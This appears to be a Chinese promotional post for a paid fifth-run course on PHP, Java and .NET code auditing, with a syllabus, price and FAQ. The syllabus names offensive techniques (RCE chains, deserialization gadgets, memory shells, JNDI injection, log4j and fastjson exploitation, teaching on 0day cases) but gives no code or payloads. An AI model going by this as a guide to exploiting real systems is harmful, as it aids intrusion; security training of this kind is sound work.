![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRsWiaBourCibP8KJhicmER5u30RPiaqQtpjyUDz68mqRf83YFbpMDicSP04pWFqwpmcu8ulkiaIAuYiaCfkSBDMjTfK5QWsibQyiaHu9iaE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=66 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRL62xW6icRubXxnJKuARqopPjCfjyW20aZh8kuSb8ic6RWicPic8MVS7G3H3Xz6A92ShhGica2oXjPHZ8juJcpsJH0o8PMhEyowy00/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=67 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kR9Junc0UcRmWetnnL3XgeDibwPs6Y32yWX8OnBGfmQANCmhzcOLPXcvDGKPZ0Kw1GYovIZZE41X61jkib4WibHgKAeDdXNFRMvnk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=68 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRuL71RuJiamyT3u09WSicFC5BZ1gqF2ic53VDQrH7MQyRsvr8fHu8XU3I83q666cUBtbdeSEoQsLmoj8rFicz4xibTrfgG789nOic0s/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=69 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSWM2dGVkVicibdjMWyy7UIovYOWHicicqJbJVbLbgiayCcKywOwI1bGFe4jfEsBMecNCkIEwFibo0wv5sOMLrMT66rrXYPWsxp53Vxs/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=70 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSr4HHCv0f8Ciajicxtq8IJSoI0PaQm91TXgXIssyOxlu88GykNxdYGviaZeBAqVhZOBOib1sJ3dUnKUORffFWSTRncJ0pRiaaq8qTM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=71 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSHrbocb5VNZ9NRe2BjdHnzicbyBuOcgU2Ro6xrMCBzR7rzibKJtUfN4cgQsEGMVB3JgPdZzMumVtmxIxxacDlia8fibWugiaf3iaIes/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=72 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRlJcCtd9o06uPBRQxH4bVavw2VPe7vobQJr1R7aXLZNP8plJ6NRvITcsvaWRrB8gowbhbtctpuVfXZ7qL8T6WibwTmAbBCrqzU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=73 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRYgargWJfW2iaicTp9uNbJt2LhqtQNEYl1XSpiaE6vXHVcEWU9pQo5waLfpl4GRLE1ZHQNg10HHKOWCfajS1E0dV29Z3ibnQ9SkM0/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=74 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRjZDS0WQDlX6QJSfiaxTacu00FIkfujiao4WGEV2PK4EdcHhFTgGUVKIBVqqpI5fVlruar2ia4VNPXTbmDW3sIia3f0Cfa4YCjuQc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=75 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRONVYP8S10pmiaNGEFViaLFVsms5FjMCeytufKsO7Q7OHtddeP2KNEiaibrrnPDR68GqqwV9kmACialUnadFJmM5iaO3p3axRWCghew/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=76 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRcV9cfBE2Pt3yWnA7LyUe98zicFPEkzDGAco22c9B2hibXQ9VbF9nMy2GoU2SnRlL8EYk3vDrHTHiaf9LjTdgkROQuL3XLqFJaTQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=77 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTD8mR0u9uhibnkOsdEfn8ZXqBibzL4U0iaueZWKuAD0NIONA7ojUMBH8CtyicMDDjvZ3kBFGRFwvicuuFjFPhkTibsN77DKv1quNJNw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=78 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRlVbG2GR4Jclvibx9MMx1fevRH1uQcC2LuKypTf3rmIjMRJ6eJhxEPeonnfzqUnyFNogCU9Lw95DGmfQbhXnj1L0goSdqT86l8/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=79 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRgCElAKo2WUib3GY0G0VSEKZc8cEHsHW4BP3663d36UtZILuh9GgYkB8BXDnmxgUaZG6EOmmF4YzwbQew8RIIac5PC7Ix0CkIg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=80 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSib2DmsbOqaaTdxEzhphR24icCv5rbzmqJIQtH504zsicDtqLZSejsmBwQ8fQuCDaic59Nr0OzDR6Iibfztw5ZicHnOq9UAaht8mibMY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=81 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQVTDtgoky505wJBsBeprDzMTYLlAH4XtZOxz5UsYicJnqudL4afwsTy8BdVjg9K7eHm2IovD2dPRBn0KfoaykhSp0ufGda65kg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=82 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTMoZBTPTY1FGzSiaX6jjq1hpX3hwG1CW61tDUwINN96UOiaLSJFQ9OL8ojmsX8IMUCwuSLII1YhpiaMQG8JHtgqQ2JLnzT2fwHy4/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=83 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTqibV5UElYSp0GX5ic6mYLNtXWqMiaZ940LdPBHhux3Hicg97xiafu1jtLnJMbCsAYAFVlOETvicYFmJjmzfVmDL9XDictFC6CSCb2ls/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=84 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRJJ5nteHtgMtSFknpbluDwBl7ja7iad5Chzft5dc5VfqsHduhozXaSNdiapsB5gBxUEO5eSibf0JRM3PYlFXl3qw6kibpadElrVlA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=85 "")  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
(其实报喜一个是为了宣传，更重要的其实每当学员来报喜的时候，都有一种成就感，最起码能够认定自己的课程是有一定价值一定性价比的，而且确实收了师傅们的钱，能够帮助到师傅们一些，自己也就更有坚持下去做培训的信心。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=120 "")  
  
二、第五期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=121 "")  
  
  
  
    第五期课程仍然是以代码审计为主，本次课程还是为三个语言的代码审计0-1讲解，目的为帮助学员完成0-1+1的白盒（代码审计）漏洞挖掘，并且在出货的基础上再+1去出高质量的漏洞（  
例如组合拳RCE、前台相关漏洞等）。  
  
  
1  
  
开课时间&课程周期  
  
开课时间暂定为：2026年4月3日  
  
开课周期预计到：三个月左右（直播+录播）  
  
**课程大纲**  
  
    本次课程分为PHP、JAVA、NET代码审计为直播+录播，为了照顾一些基础较为薄弱的师傅新增基础~技巧~番外（录播课程）。  
  
  
01  
  
PHP&JAVA&NET代码审计 (直播+录播)  
  
     
  
    之前课程大纲主要为xxx实战案例，本次课程大纲着重体现思路方向，并非取消了实战部分，实战部分之多不减。  
  
PHP课程目录  
  
  
✅   
   
第一节课：多框架初识&路由认识&参数传递  
  
✅   
   
第二节课：多框架&鉴权分析&认证与鉴权&鉴权方式  
  
✅   
   
第三节课：多框架&常见漏洞函数&回显&非回显  
  
✅   
   
第四节课：注入漏洞&常见位置&实战审计注入类漏洞  
  
✅   
   
第五节课：前台RCE漏洞审计&漏洞案例技巧讲解  
  
✅   
   
第六节课：门户网站CMS&网络设备&审计经验讲解  
  
✅   
   
第七节课：多框架&鉴权对抗&权限绕过技巧&案例分析  
  
✅   
   
第八节课：组合拳RCE漏洞分析&漏洞组合拳利用&案例  
  
✅   
   
第九节课：PHP下反序列化漏洞&魔术方法&pop链分析  
  
✅   
   
第十节课：PHP下反序列化漏洞实战&phar协议RCE案例  
  
  
JAVA课程目录  
  
  
✅   
   
第一节课：Servlet&Spring Boot&Spring MVC&Struts2  
  
✅   
   
第二节课：多框架下&拦截器&认证鉴权&组件鉴权分析  
  
✅   
   
第三节课：多框架下&权限绕过&鉴权对抗&案例分析  
  
✅   
   
第四节课：常见漏洞函数&案例分析&审计技巧  
  
✅   
   
第五节课：前台漏洞审计&组合拳rce漏洞&技巧&案例  
  
✅   
   
第六节课：反序列化&CC链利用&反序列化漏洞利用  
  
✅   
   
第七节课：  
Ognl&SpEl&EL表达式注入&漏洞案例  
  
✅   
   
第八节课：内存马简介&内存马原理分析&内存马注入方式  
  
✅   
   
第九节课：RMI&JNDI注入&JNDI注入漏洞利用&案例  
  
✅   
   
第十节课：组件漏洞&shiro&fastjson&log4j分析&利用  
  
  
.NET课程目录  
  
  
✅   
   
第一节课：初识.NET&Web From & MVC架构框架分析  
  
✅   
   
第二节课：Web From&MVC框架&鉴权分析&认证方式  
  
✅   
   
第三节课：多框架下&鉴权对抗&权限绕过分析&案例  
  
✅   
   
第四节课：注入漏洞分析&文件操作类漏洞&实战分析  
  
✅   
   
第五节课：常见漏洞位置&前台漏洞审计&漏洞案例讲解  
  
✅   
   
第六节课：组合拳RCE漏洞分析&组合拳RCE案例讲解  
  
✅    
第七节课：.NET反序列化漏洞初识&反序列化漏洞原理  
  
✅    
第八节课：.NET安全反序列化链&反序列化触发场景  
  
✅    
第九节课：.NET反序列化漏洞案例&反序列化漏洞分析  
  
  
02  
  
基础~技巧~番外（录播)  
  
  
该篇章为长期更新  
  
  
1  
  
基础篇章  
  
1、  
由于之前上课时部分师傅存在一定基础，刚开始的课程部分师傅认为自己可以跟的上等问题，导致时间的浪费。  
  
  
2、  
同时有一定的师傅存在无法搭建源码，以及软件下载等问题，于是将这种基础问题，统一归纳为基础篇章，供师傅们学习，节省师傅们时间提升学习效率及课程质量  
  
  
3、同时面对部分学员频繁提出的一些问题，针对该问题同样会进行解答，并且进行录制上传至基础篇章中。  
  
  
2  
  
技巧篇章  
  
1、  
随着自己技术的进步也了解到了一些新型的技巧或者手法，例如sql注入的某一个技巧，但是重新讲解又浪费大量时间，特地新增了技巧篇章，将单独的技巧进行讲解  
。  
  
  
3  
  
番外篇章  
  
1、自己在第四期讲过一些逆向相关，并且还存在相关的一些好的案例，得到了挺多师傅的认可，例如某APP接管存储桶等案例，于是之后在有好的案例将进行上传更新。  
  
**课程思维导图**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRHzK0QwCicUSnVLcSKs4y2BCZYDWLo33jSX6bamuWtd2srpfkejIcxJUictLrvAzHl41rHvAFDVdgInsdibzVeiayrS48oym4mQ4Y/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=122 "")  
  
  
**常见疑问&课程讲解**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=123 "")  
  
第五期课程  
收费多少？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=124 "")  
  
本次课程收费仍然是  
1688，并且还是承诺一次报名后续不再进行任何二次收费保障（包含  
内部平台，  
以及后续推出一系列内容均可观看）。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=125 "")  
  
什么时间段上课，上课周期是多长时间？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=126 "")  
  
第五期课程【直播+录播】上课周期为  
三个月，一般集中在  
周五六日这三天，一周保持  
2～3节课，每节课  
1小时左右。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=127 "")  
  
作为学员，我们都有哪些权益？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=128 "")  
  
首先最关键的就是  
课程内容是可以一直学习的，同时  
内部报告平台也可进行观看，  
答疑是不限时长，不限类型方向，任何方向均可，再次同时代码审计最关键的就是源码，  
源码&课件&视频都是给兄弟们配套的，当然无聊找小朋友聊天一起打游戏也可以哦。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=129 "")  
  
学完之后可以达到什么水平？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=130 "")  
  
学完之后可以达到可以进行  
独立审计的水平，在面对  
php、JAVA、NET主流语言的源码，可以进行  
独立审计，  
验证漏洞，对于一些  
JAVA安全内容例如：  
反序列化，内存马等也有一定的理解，可以进行打  
反序列化漏洞、  
注入内存马等操作，同时  
PHP的反序列化、pop链，phar协议等利用也有一定理解，且此类漏洞导致RCE  
均有案例。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=131 "")  
  
0基础可以学吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=132 "")  
  
1、这是大家最常问的一个问题，  
0基础是可以的，我的代码审计课程一直秉持着  
帮助大家完成代码审计0-1的目标，同时往期（第四期）课程新增了进阶课，其目的也是帮助大家完成  
0-1出洞到0-1出有质量的漏洞。  
  
  
2、另外考虑到有的  
学员基础较为薄弱，本期同时也开了  
番外篇&基础篇，师傅们可以观看这块分区课程内容，此类分块课程目的就是为  
协助到一些基础比较薄弱的师傅们。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=133 "")  
  
是那种读PPT拿着靶场讲解吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=134 "")  
  
不会，课程均使用一些  
0Day&1Day&Nday优质漏洞来进行授课，且本期案例均为从  
简-难漏洞案例，深度体验代码审计当中的  
难易区分，  
完全杜绝靶场以及去读PPT的，从培训第一期开始到现在，基本为上课开始看几眼课件，  
让学员熟悉这节课的大概内容等信息，然后  
直接实操到下课，这一点也是  
我干培训五期以来一直使用的授课方式。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=135 "")  
  
是否有简历修改&内推等福利？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=136 "")  
  
有的兄弟，有的，  
不介意小朋友的指导简历这类的话，随时欢迎大家来骚扰我。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=137 "")  
  
为什么你不新增AI方向的内容？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=138 "")  
  
目前我个人认为AI可以帮助我们  
提升很大的效率，但是前提是  
AI的使用者本身要懂这个技术，才可以利用AI来  
降低该技术门槛，提升效率，  
完全自动化目前感觉还是无法做到，包括  
课程当中也会使用AI会顺带着给师傅讲了  
如何用ai来提升效率，同时如果反馈不会使用的师傅较多，会考虑后续在基础～技巧～番外来更新该方向内容。  
  
  
**联系方式**  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRlKCsacPUztjcVu1uFsNA8aia0w2dCazcZq2FoZ9I8ibuPJzgUtANyBic4fRXpsLEfRYPghdkicZ98HxicNQWZEqwWY1onth3lDsV8/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
  
